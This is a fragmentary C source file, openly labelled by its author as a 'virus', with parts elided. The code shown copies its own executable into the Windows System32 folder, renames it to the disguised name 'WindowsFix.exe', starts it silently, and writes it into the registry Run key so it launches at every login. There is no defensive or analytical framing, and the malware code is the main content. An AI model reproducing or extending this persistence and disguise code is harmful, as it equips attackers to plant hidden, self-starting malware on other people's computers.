/*
	* brief: loading my virus!
	* auther: zhangpy
	* version 8.6
	* data 2023-1-24 19:54:48
*/
...
void copy()
{
    system("xcopy v8.6.exe C:\\Windows\\System32\\ /y /q /k > t.tmp");
    system("del t.tmp");
    system("rename C:\\Windows\\System32\\v8.6.exe WindowsFix.exe");
    system("start /b C:\\Windows\\System32\\WindowsFix.exe");
}
...
void selfstart() 
{
    ...
    //Gets the absolute path of the exe file to start automatically
    GetModuleFileName(NULL, szPath, dwSize);

    //Create or open the HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun key in the registry
    ...
    //Write the absolute path of the exe file to the registry
    lRet = RegSetValueEx(hKey,_T("WindowsFix.exe"), 0, REG_SZ, (const BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));
    if (lRet != ERROR_SUCCESS)
    {
...
/// @brief transform the hex into char
/// @param a the char
